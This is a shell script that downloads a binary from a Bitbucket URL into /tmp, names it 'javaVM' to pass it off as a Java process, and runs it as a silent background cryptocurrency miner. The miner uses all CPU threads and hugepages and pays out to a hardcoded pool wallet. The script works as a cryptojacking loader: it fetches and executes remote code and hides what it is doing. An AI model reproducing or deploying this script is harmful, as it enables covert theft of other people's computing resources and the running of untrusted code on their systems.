#!/bin/sh
WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://bitbucket.org/kacepot/file/downloads/sarebu -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
fi
